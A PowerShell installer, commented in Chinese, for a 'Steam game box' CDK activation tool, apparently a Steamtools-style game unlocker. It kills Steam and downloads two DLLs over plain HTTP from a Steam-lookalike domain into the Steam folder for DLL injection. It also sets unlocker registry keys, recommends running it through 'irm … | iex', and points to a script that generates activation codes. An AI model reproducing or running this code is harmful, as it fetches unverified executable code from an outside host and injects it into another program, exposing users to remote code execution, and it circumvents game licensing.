# Steam 游戏盒子 - 一键安装脚本（参考 irm steamfn.com|iex 流程）
# 本地运行: powershell -ExecutionPolicy Bypass -File install.ps1
# 托管后:   irm https://你的域名/install.ps1 | iex

$ErrorActionPreference = "Stop"

function Write-Step($msg) {
    Write-Host "[*] $msg" -ForegroundColor Cyan
}

function Write-Ok($msg) {
    Write-Host "[OK] $msg" -ForegroundColor Green
}

function Write-Err($msg) {
    Write-Host "[ERR] $msg" -ForegroundColor Red
}

function Get-SteamPath {
    $paths = @(
        (Get-ItemProperty -Path "HKCU:\Software\Valve\Steam" -Name "SteamPath" -ErrorAction SilentlyContinue).SteamPath,
        (Get-ItemProperty -Path "HKLM:\Software\WOW6432Node\Valve\Steam" -Name "InstallPath" -ErrorAction SilentlyContinue).InstallPath,
        "D:\steam",
        "C:\Program Files (x86)\Steam"
    )
    foreach ($p in $paths) {
        if ($p -and (Test-Path (Join-Path $p "steam.exe"))) {
            return $p
        }
    }
    return $null
}

function Stop-Steam {
    foreach ($proc in @("steam.exe", "steamwebhelper.exe")) {
        try { Stop-Process -Name ($proc -replace "\.exe$","") -Force -ErrorAction SilentlyContinue } catch {}
    }
    Start-Sleep -Seconds 2
}

function Get-PythonExe {
    $candidates = @(
        "$env:LOCALAPPDATA\Programs\Python\Python312\python.exe",
        "$env:LOCALAPPDATA\Programs\Python\Python311\python.exe",
        "$env:LOCALAPPDATA\Programs\Python\Python310\python.exe"
    )
    foreach ($c in $candidates) {
        if (Test-Path $c) { return $c }
    }
    $py = Get-Command python -ErrorAction SilentlyContinue
    if ($py) { return $py.Source }
    $pyLauncher = Get-Command py -ErrorAction SilentlyContinue
    if ($pyLauncher) { return "py -3" }
    return $null
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Blue
Write-Host "   Steam 游戏盒子 - CDK 激活环境安装" -ForegroundColor Blue
Write-Host "========================================" -ForegroundColor Blue
Write-Host ""

# 确定项目目录
$BoxRoot = $PSScriptRoot
if (-not $BoxRoot) { $BoxRoot = Split-Path -Parent $MyInvocation.MyCommand.Path }
if (-not (Test-Path (Join-Path $BoxRoot "frontend_box.py"))) {
    Write-Err "未找到 frontend_box.py，请将 install.ps1 放在游戏盒子目录内运行"
    exit 1
}

Set-Location $BoxRoot
Write-Ok "项目目录: $BoxRoot"

# 1. 检测 Steam
Write-Step "检测 Steam 安装路径…"
$steamPath = Get-SteamPath
if (-not $steamPath) {
    Write-Err "未找到 Steam，请先安装 Steam 或在 config.json 设置 Custom_Steam_Path"
    exit 1
}
Write-Ok "Steam 路径: $steamPath"

# 2. 写入 config.json
$configPath = Join-Path $BoxRoot "config.json"
if (Test-Path $configPath) {
    try {
        $cfg = Get-Content $configPath -Raw -Encoding UTF8 | ConvertFrom-Json
        $cfg.Custom_Steam_Path = ($steamPath -replace "\\", "\\")
        $cfg.Force_Unlocker = "steamtools"
        $cfg | ConvertTo-Json -Depth 6 | Set-Content $configPath -Encoding UTF8
        Write-Ok "已更新 config.json"
    } catch {
        Write-Host "警告: 无法更新 config.json，请手动设置 Steam 路径" -ForegroundColor Yellow
    }
}

# 3. 关闭 Steam
Write-Step "关闭 Steam 进程…"
Stop-Steam

# 4. 部署注入 DLL（与盒子内置注入相同源）
Write-Step "部署内置注入组件…"
$dllMap = @{
    "xinput1_4.dll" = "http://update.steamcdn.com/update"
    "dwmapi.dll"    = "http://update.steamcdn.com/dwmapi"
}
foreach ($entry in $dllMap.GetEnumerator()) {
    $target = Join-Path $steamPath $entry.Key
    try {
        if ((Test-Path $target) -and ((Get-Item $target).Length -gt 100000)) {
            Write-Ok "$($entry.Key) 已存在"
            continue
        }
        Invoke-WebRequest -Uri $entry.Value -OutFile $target -UseBasicParsing -TimeoutSec 90
        Write-Ok "已部署 $($entry.Key)"
    } catch {
        Write-Err "部署 $($entry.Key) 失败: $_"
        exit 1
    }
}

# 5. 创建插件目录 + 修正注册表
$stplug = Join-Path $steamPath "config\stplug-in"
New-Item -ItemType Directory -Force -Path $stplug | Out-Null
$steamPathReg = ($steamPath -replace "\\", "/")
reg add "HKCU\Software\Valve\Steamtools" /v SteamPath /t REG_SZ /d $steamPathReg /f | Out-Null
reg add "HKCU\Software\Valve\Steamtools" /v iscdkey /t REG_SZ /d true /f | Out-Null
Write-Ok "插件目录与注册表已就绪"

# 6. 安装 Python 依赖
Write-Step "检查 Python 环境…"
$python = Get-PythonExe
if (-not $python) {
    Write-Err "未找到 Python，请安装 Python 3.10+ 并勾选 Add to PATH"
    Write-Host "下载: https://www.python.org/downloads/" -ForegroundColor Yellow
    exit 1
}
Write-Ok "Python: $python"

Write-Step "安装依赖包…"
$pipArgs = @("-m", "pip", "install", "-q", "aiofiles", "colorlog", "httpx", "ujson", "vdf", "colorama", "Pillow")
if ($python -eq "py -3") {
    & py -3 @pipArgs
} else {
    & $python @pipArgs
}
Write-Ok "依赖安装完成"

# 7. 重启 Steam
Write-Step "重启 Steam…"
$steamExe = Join-Path $steamPath "steam.exe"
Start-Process -FilePath $steamExe -WorkingDirectory $steamPath
Start-Sleep -Seconds 3
Write-Ok "Steam 已启动"

# 8. 启动游戏盒子 CDK 页面
Write-Step "启动 CDK 激活界面…"
if ($python -eq "py -3") {
    Start-Process -FilePath "py" -ArgumentList @("-3", "frontend_box.py", "--cdk") -WorkingDirectory $BoxRoot
} else {
    Start-Process -FilePath $python -ArgumentList @("frontend_box.py", "--cdk") -WorkingDirectory $BoxRoot
}

Write-Host ""
Write-Ok "安装完成！请在盒子「CDK 激活」页输入激活码"
Write-Host "演示 CDK: DEMO-7300-CSGO-0001" -ForegroundColor Yellow
Write-Host "生成 CDK: python gen_cdk.py 730 --count 5" -ForegroundColor Yellow
Write-Host ""
